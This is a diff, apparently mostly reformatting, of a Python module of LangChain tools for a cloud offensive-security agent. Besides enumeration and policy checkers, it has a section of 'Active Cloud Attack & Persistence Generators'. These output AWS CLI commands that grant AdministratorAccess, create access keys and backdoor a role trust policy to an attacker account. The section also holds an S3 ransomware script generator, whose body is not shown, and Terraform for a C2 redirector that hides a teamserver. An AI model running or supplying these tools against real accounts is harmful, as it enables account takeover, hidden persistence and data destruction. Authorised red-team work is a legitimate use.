@@ -1,9 +1,8 @@
 import json
-import asyncio
-from datetime import datetime
-from typing import Any, List, Dict
-from myth_config import load_dotenv
+
 from langchain_core.tools import tool
+
+from myth_config import load_dotenv
 from tools.utilities.report import format_industrial_result
 
 load_dotenv()
@@ -16,30 +15,35 @@ load_dotenv()
 # --- Cloud Infrastructure Assessment ---
 try:
     import boto3
-    from botocore.exceptions import ClientError
+
     HAS_BOTO3 = True
 except ImportError:
     HAS_BOTO3 = False
 
 try:
-    from google.cloud import iam_v1, storage as gcp_storage
+    from google.cloud import iam_v1
+    from google.cloud import storage as gcp_storage
+
     HAS_GCP_LIBS = True
 except ImportError:
     HAS_GCP_LIBS = False
 
 try:
     from azure.identity import DefaultAzureCredential
-    from azure.mgmt.storage import StorageManagementClient
     from azure.storage.blob import BlobServiceClient
+
     HAS_AZURE_LIBS = True
 except ImportError:
     HAS_AZURE_LIBS = False
 
 try:
-    from kubernetes import client, config as k8s_config
+    from kubernetes import client
+    from kubernetes import config as k8s_config
+
     HAS_K8S_LIB = True
 except ImportError:
     HAS_K8S_LIB = False
+
 
 @tool
 async def aws_advanced_enumerator(target_account: str = "self") -> str:
@@ -50,52 +54,62 @@ async def aws_advanced_enumerator(target_account: str = "self") -> str:
     """
     try:
         if not HAS_BOTO3:
-             return format_industrial_result("aws_advanced_enumerator", "Dependency Gap", summary="boto3 missing.")
+            return format_industrial_result(
+                "aws_advanced_enumerator", "Dependency Gap", summary="boto3 missing."
+            )
 
         results = {}
         regions = ["us-east-1", "us-west-2", "eu-central-1", "ap-southeast-1"]
-        
+
         # 1. IAM Audit
-        iam = boto3.client('iam')
+        iam = boto3.client("iam")
         try:
             users = iam.list_users()
-            results['iam_users'] = [{"name": u['UserName'], "id": u['UserId']} for u in users.get('Users', [])]
-        except Exception as e: results['iam_error'] = str(e)
+            results["iam_users"] = [
+                {"name": u["UserName"], "id": u["UserId"]}
+                for u in users.get("Users", [])
+            ]
+        except Exception as e:
+            results["iam_error"] = str(e)
 
         # 2. S3 Audit
-        s3 = boto3.client('s3')
+        s3 = boto3.client("s3")
         try:
             buckets = s3.list_buckets()
-            results['s3_buckets'] = [b['Name'] for b in buckets.get('Buckets', [])]
-        except Exception as e: results['s3_error'] = str(e)
-            
+            results["s3_buckets"] = [b["Name"] for b in buckets.get("Buckets", [])]
+        except Exception as e:
+            results["s3_error"] = str(e)
+
         # 3. Regional Infrastructure (EC2 & Lambda)
-        results['infrastructure'] = {}
+        results["infrastructure"] = {}
         for region in regions:
-             try:
-                 reg_data = {"ec2": 0, "lambda": 0}
-                 ec2 = boto3.client('ec2', region_name=region)
-                 instances = ec2.describe_instances()
-                 for r in instances.get('Reservations', []):
-                     reg_data["ec2"] += len(r.get('Instances', []))
-                 
-                 lambda_client = boto3.client('lambda', region_name=region)
-                 functions = lambda_client.list_functions()
-                 reg_data["lambda"] = len(functions.get('Functions', []))
-                 
-                 if reg_data["ec2"] > 0 or reg_data["lambda"] > 0:
-                     results['infrastructure'][region] = reg_data
-             except: pass
+            try:
+                reg_data = {"ec2": 0, "lambda": 0}
+                ec2 = boto3.client("ec2", region_name=region)
+                instances = ec2.describe_instances()
+                for r in instances.get("Reservations", []):
+                    reg_data["ec2"] += len(r.get("Instances", []))
+
+                lambda_client = boto3.client("lambda", region_name=region)
+                functions = lambda_client.list_functions()
+                reg_data["lambda"] = len(functions.get("Functions", []))
+
+                if reg_data["ec2"] > 0 or reg_data["lambda"] > 0:
+                    results["infrastructure"][region] = reg_data
+            except Exception:
+                pass
 
         return format_industrial_result(
             "aws_advanced_enumerator",
             "Enumeration Complete",
             impact="HIGH",
             raw_data=results,
-            summary=f"Discovered {len(results.get('s3_buckets', []))} buckets and infrastructure in {len(results['infrastructure'])} regions."
+            summary=f"Discovered {len(results.get('s3_buckets', []))} buckets and infrastructure in {len(results['infrastructure'])} regions.",
         )
     except Exception as e:
-        return format_industrial_result("aws_advanced_enumerator", "Error", error=str(e))
+        return format_industrial_result(
+            "aws_advanced_enumerator", "Error", error=str(e)
+        )
 
 
 @tool
@@ -105,30 +119,41 @@ async def aws_iam_privilege_escalation_checker(iam_policy_json: str) -> str:
     """
     try:
         policy = json.loads(iam_policy_json)
-        risky_actions = ["iam:CreatePolicyVersion", "iam:PassRole", "iam:CreateAccessKey", "iam:*", "*"]
+        risky_actions = [
+            "iam:CreatePolicyVersion",
+            "iam:PassRole",
+            "iam:CreateAccessKey",
+            "iam:*",
+            "*",
+        ]
         findings = []
-        
+
         statements = policy.get("Statement", [])
-        if isinstance(statements, dict): statements = [statements]
-        
+        if isinstance(statements, dict):
+            statements = [statements]
+
         for stmt in statements:
-             if stmt.get("Effect") == "Allow":
-                 actions = stmt.get("Action", [])
-                 if isinstance(actions, str): actions = [actions]
-                 matched = [a for a in actions if a in risky_actions]
-                 if matched:
-                     findings.append({"risky": matched, "severity": "HIGH"})
-                     
+            if stmt.get("Effect") == "Allow":
+                actions = stmt.get("Action", [])
+                if isinstance(actions, str):
+                    actions = [actions]
+                matched = [a for a in actions if a in risky_actions]
+                if matched:
+                    findings.append({"risky": matched, "severity": "HIGH"})
+
         return format_industrial_result(
             "aws_iam_privilege_escalation_checker",
             "Analysis Complete",
             confidence=1.0,
             impact="HIGH" if findings else "Low",
             raw_data={"policy": policy, "findings": findings},
-            summary=f"Discovered {len(findings)} privilege escalation vectors in IAM policy."
+            summary=f"Discovered {len(findings)} privilege escalation vectors in IAM policy.",
         )
     except Exception as e:
-        return format_industrial_result("aws_iam_privilege_escalation_checker", "Error", error=str(e))
+        return format_industrial_result(
+            "aws_iam_privilege_escalation_checker", "Error", error=str(e)
+        )
+
 
 @tool
 async def azure_role_analyzer(role_definition_json: str) -> str:
@@ -137,20 +162,27 @@ async def azure_role_analyzer(role_definition_json: str) -> str:
     """
     try:
         role = json.loads(role_definition_json)
-        actions = role.get("properties", {}).get("permissions", [{}])[0].get("actions", [])
-        critical = ["*", "Microsoft.Authorization/*", "Microsoft.Storage/storageAccounts/listKeys/action"]
+        actions = (
+            role.get("properties", {}).get("permissions", [{}])[0].get("actions", [])
+        )
+        critical = [
+            "*",
+            "Microsoft.Authorization/*",
+            "Microsoft.Storage/storageAccounts/listKeys/action",
+        ]
         matched = [a for a in actions if a in critical]
-        
+
         return format_industrial_result(
             "azure_role_analyzer",
             "Azure Audit Complete",
             confidence=0.95,
             impact="HIGH" if matched else "Low",
             raw_data={"role_id": role.get("id"), "risky_actions": matched},
-            summary=f"Azure RBAC audit identified {len(matched)} high-risk permissions."
+            summary=f"Azure RBAC audit identified {len(matched)} high-risk permissions.",
         )
     except Exception as e:
         return format_industrial_result("azure_role_analyzer", "Error", error=str(e))
+
 
 @tool
 async def gcp_service_account_scanner(gcp_project_id: str) -> str:
@@ -160,11 +192,15 @@ async def gcp_service_account_scanner(gcp_project_id: str) -> str:
     """
     try:
         if not HAS_GCP_LIBS:
-            return format_industrial_result("gcp_service_account_scanner", "Dependency Gap", summary="google-cloud-iam missing.")
-            
+            return format_industrial_result(
+                "gcp_service_account_scanner",
+                "Dependency Gap",
+                summary="google-cloud-iam missing.",
+            )
+
         client = iam_v1.IAMClient()
         project_path = f"projects/{gcp_project_id}"
-        
+
         accounts = []
         try:
             for account in client.list_service_accounts(name=project_path):
@@ -172,19 +208,30 @@ async def gcp_service_account_scanner(gcp_project_id: str) -> str:
                 risk = "MEDIUM"
                 if "admin" in account.email.lower() or "owner" in account.email.lower():
                     risk = "HIGH"
-                accounts.append({"email": account.email, "unique_id": account.unique_id, "risk": risk})
+                accounts.append(
+                    {
+                        "email": account.email,
+                        "unique_id": account.unique_id,
+                        "risk": risk,
+                    }
+                )
         except Exception as e:
-             return format_industrial_result("gcp_service_account_scanner", "Auth/API Error", error=str(e))
+            return format_industrial_result(
+                "gcp_service_account_scanner", "Auth/API Error", error=str(e)
+            )
 
         return format_industrial_result(
             "gcp_service_account_scanner",
             "Scan Complete",
             impact="HIGH" if accounts else "LOW",
             raw_data={"project": gcp_project_id, "accounts": accounts},
-            summary=f"Analyzed {len(accounts)} service accounts in GCP project {gcp_project_id}."
+            summary=f"Analyzed {len(accounts)} service accounts in GCP project {gcp_project_id}.",
         )
     except Exception as e:
-        return format_industrial_result("gcp_service_account_scanner", "Error", error=str(e))
+        return format_industrial_result(
+            "gcp_service_account_scanner", "Error", error=str(e)
+        )
+
 
 @tool
 async def kubernetes_misconfig_scanner(cluster_ip: str) -> str:
@@ -194,34 +241,58 @@ async def kubernetes_misconfig_scanner(cluster_ip: str) -> str:
     """
     try:
         if not HAS_K8S_LIB:
-            return format_industrial_result("kubernetes_misconfig_scanner", "Dependency Gap", summary="kubernetes library missing.")
+            return format_industrial_result(
+                "kubernetes_misconfig_scanner",
+                "Dependency Gap",
+                summary="kubernetes library missing.",
+            )
 
         try:
-            k8s_config.load_kube_config() # Try local config first
+            k8s_config.load_kube_config()  # Try local config first
             v1 = client.CoreV1Api()
             pods = v1.list_pod_for_all_namespaces(watch=False)
-            
+
             findings = []
             for pod in pods.items:
                 pod_name = pod.metadata.name
                 for container in pod.spec.containers:
-                    if container.security_context and container.security_context.privileged:
-                         findings.append({"pod": pod_name, "vector": "Privileged Container", "severity": "CRITICAL"})
-                    
+                    if (
+                        container.security_context
+                        and container.security_context.privileged
+                    ):
+                        findings.append(
+                            {
+                                "pod": pod_name,
+                                "vector": "Privileged Container",
+                                "severity": "CRITICAL",
+                            }
+                        )
+
                     if pod.spec.host_network:
-                         findings.append({"pod": pod_name, "vector": "Host Network Access", "severity": "HIGH"})
+                        findings.append(
+                            {
+                                "pod": pod_name,
+                                "vector": "Host Network Access",
+                                "severity": "HIGH",
+                            }
+                        )
         except Exception as e:
-            return format_industrial_result("kubernetes_misconfig_scanner", "Config Error", error=str(e))
+            return format_industrial_result(
+                "kubernetes_misconfig_scanner", "Config Error", error=str(e)
+            )
 
         return format_industrial_result(
             "kubernetes_misconfig_scanner",
             "Audit Complete",
             impact="CRITICAL" if findings else "LOW",
             raw_data={"pod_count": len(pods.items), "findings": findings},
-            summary=f"K8s Audit finished. Found {len(findings)} critical Pod misconfigurations."
+            summary=f"K8s Audit finished. Found {len(findings)} critical Pod misconfigurations.",
         )
     except Exception as e:
-        return format_industrial_result("kubernetes_misconfig_scanner", "Error", error=str(e))
+        return format_industrial_result(
+            "kubernetes_misconfig_scanner", "Error", error=str(e)
+        )
+
 
 @tool
 async def cloud_trail_analyzer(log_snippet: str) -> str:
@@ -230,18 +301,21 @@ async def cloud_trail_analyzer(log_snippet: str) -> str:
     """
     try:
         anomalies = []
-        if "Terminate" in log_snippet: anomalies.append("Resource Termination")
-        if "Delete" in log_snippet: anomalies.append("Resource Deletion")
+        if "Terminate" in log_snippet:
+            anomalies.append("Resource Termination")
+        if "Delete" in log_snippet:
+            anomalies.append("Resource Deletion")
         return format_industrial_result(
             "cloud_trail_analyzer",
             "Analysis Complete",
             confidence=0.85,
             impact="MEDIUM" if anomalies else "Low",
             raw_data={"detections": anomalies},
-            summary=f"Discovered {len(anomalies)} security anomalies in CloudTrail logs."
+            summary=f"Discovered {len(anomalies)} security anomalies in CloudTrail logs.",
         )
     except Exception as e:
         return format_industrial_result("cloud_trail_analyzer", "Error", error=str(e))
+
 
 @tool
 async def storage_account_enumeration(account_name: str, provider: str = "aws") -> str:
@@ -252,47 +326,65 @@ async def storage_account_enumeration(account_name: str, provider: str = "aws") 
     try:
         findings = []
         if provider.lower() == "aws" and HAS_BOTO3:
-            s3 = boto3.client('s3')
+            s3 = boto3.client("s3")
             try:
                 response = s3.get_bucket_policy_status(Bucket=account_name)
-                if response.get('PolicyStatus', {}).get('IsPublic'):
+                if response.get("PolicyStatus", {}).get("IsPublic"):
                     findings.append({"bucket": account_name, "status": "PUBLIC_POLICY"})
-            except: pass
-            
+            except Exception:
+                pass
+
         elif provider.lower() == "gcp" and HAS_GCP_LIBS:
             client = gcp_storage.Client()
             try:
-                bucket = client.get_bucket(account_name)
+                client.get_bucket(account_name)
                 findings.append({"bucket": account_name, "status": "ACCESS_VERIFIED"})
-            except: pass
+            except Exception:
+                pass
 
         elif provider.lower() == "azure" and HAS_AZURE_LIBS:
             try:
-                blob_service_client = BlobServiceClient(account_url=f"https://{account_name}.blob.core.windows.net", credential=DefaultAzureCredential())
+                blob_service_client = BlobServiceClient(
+                    account_url=f"https://{account_name}.blob.core.windows.net",
+                    credential=DefaultAzureCredential(),
+                )
                 containers = blob_service_client.list_containers()
                 for c in containers:
-                    findings.append({"container": c.name, "public_access": c.public_access})
-            except: pass
+                    findings.append(
+                        {"container": c.name, "public_access": c.public_access}
+                    )
+            except Exception:
+                pass
 
         return format_industrial_result(
             "storage_account_enumeration",
             "Discovery Complete",
             impact="HIGH" if findings else "LOW",
-            raw_data={"provider": provider, "target": account_name, "findings": findings},
-            summary=f"Storage audit for {account_name} ({provider}) finished. Found {len(findings)} exposed interfaces."
+            raw_data={
+                "provider": provider,
+                "target": account_name,
+                "findings": findings,
+            },
+            summary=f"Storage audit for {account_name} ({provider}) finished. Found {len(findings)} exposed interfaces.",
         )
     except Exception as e:
-        return format_industrial_result("storage_account_enumeration", "Error", error=str(e))
+        return format_industrial_result(
+            "storage_account_enumeration", "Error", error=str(e)
+        )
+
 
 # ==============================================================================
 # ⚔️ Active Cloud Attack & Persistence Generators (Industrial Grade)
 # ==============================================================================
 
+
 @tool
-async def aws_persistence_generator(target_iam_role: str, technique: str = "shadow_admin") -> str:
+async def aws_persistence_generator(
+    target_iam_role: str, technique: str = "shadow_admin"
+) -> str:
     """
     Generates AWS CLI commands to establish persistence.
-    Techniques: 
+    Techniques:
     - 'shadow_admin': Attaches AdministratorAccess to a target user/role.
     - 'backdoor_role': Updates AssumeRolePolicy to allow external account access.
     """
@@ -301,7 +393,7 @@ async def aws_persistence_generator(target_iam_role: str, technique: str = "shad
         if technique == "shadow_admin":
             commands = [
                 f"aws iam attach-user-policy --user-name {target_iam_role} --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
-                f"aws iam create-access-key --user-name {target_iam_role}"
+                f"aws iam create-access-key --user-name {target_iam_role}",
             ]
         elif technique == "backdoor_role":
             # JSON for a permissive trust policy
@@ -311,27 +403,28 @@ async def aws_persistence_generator(target_iam_role: str, technique: str = "shad
                     {
                         "Effect": "Allow",
                         "Principal": {"AWS": "arn:aws:iam::ATTACKER_ACCOUNT_ID:root"},
-                        "Action": "sts:AssumeRole"
+                        "Action": "sts:AssumeRole",
                     }
-                ]
+                ],
             }
             trust_json = json.dumps(trust_policy).replace('"', '\\"')
             commands = [
                 f'aws iam update-assume-role-policy --role-name {target_iam_role} --policy-document "{trust_json}"'
             ]
-        
-        script = "\n".join(commands)
-        
+
         return format_industrial_result(
             "aws_persistence_generator",
             "Persistence Script Generated",
             confidence=1.0,
             impact="CRITICAL",
             raw_data={"technique": technique, "commands": commands},
-            summary=f"Generated AWS CLI commands for '{technique}' persistence targeting {target_iam_role}."
+            summary=f"Generated AWS CLI commands for '{technique}' persistence targeting {target_iam_role}.",
         )
     except Exception as e:
-        return format_industrial_result("aws_persistence_generator", "Error", error=str(e))
+        return format_industrial_result(
+            "aws_persistence_generator", "Error", error=str(e)
+        )
+
 
 @tool
 async def s3_ransomware_simulator(target_bucket: str) -> str:
@@ -397,14 +490,22 @@ if __name__ == "__main__":
             "Exploit Script Generated",
             confidence=1.0,
             impact="CRITICAL",
-            raw_data={"target": target_bucket, "script_preview": script_content[:200] + "..."},
-            summary=f"Generated S3 Ransomware simulation script for bucket '{target_bucket}'. Warning: Destructive logic included."
+            raw_data={
+                "target": target_bucket,
+                "script_preview": script_content[:200] + "...",
+            },
+            summary=f"Generated S3 Ransomware simulation script for bucket '{target_bucket}'. Warning: Destructive logic included.",
         )
     except Exception as e:
-        return format_industrial_result("s3_ransomware_simulator", "Error", error=str(e))
+        return format_industrial_result(
+            "s3_ransomware_simulator", "Error", error=str(e)
+        )
+
 
 @tool
-async def terraform_c2_infrastructure(provider: str = "aws", c2_redirect_url: str = "https://example.com") -> str:
+async def terraform_c2_infrastructure(
+    provider: str = "aws", c2_redirect_url: str = "https://example.com"
+) -> str:
     """
     Generates Terraform Code (HCL) to deploy a serverless C2 redirector.
     Uses API Gateway + Lambda (AWS) to proxy traffic to a teamserver, hiding its IP.
@@ -449,7 +550,11 @@ output "c2_url" {{
 }}
 """
         else:
-            return format_industrial_result("terraform_c2_infrastructure", "Unsupported Provider", error="Only AWS currently supported for auto-generation.")
+            return format_industrial_result(
+                "terraform_c2_infrastructure",
+                "Unsupported Provider",
+                error="Only AWS currently supported for auto-generation.",
+            )
 
         return format_industrial_result(
             "terraform_c2_infrastructure",
@@ -457,7 +562,9 @@ output "c2_url" {{
             confidence=1.0,
             impact="HIGH",
             raw_data={"provider": provider, "hcl_code": hcl_code},
-            summary=f"Generated Terraform C2 Redirector code for {provider}. Deploys API Gateway proxy pointing to {c2_redirect_url}."
+            summary=f"Generated Terraform C2 Redirector code for {provider}. Deploys API Gateway proxy pointing to {c2_redirect_url}.",
         )
     except Exception as e:
-        return format_industrial_result("terraform_c2_infrastructure", "Error", error=str(e))
+        return format_industrial_result(
+            "terraform_c2_infrastructure", "Error", error=str(e)
+        )
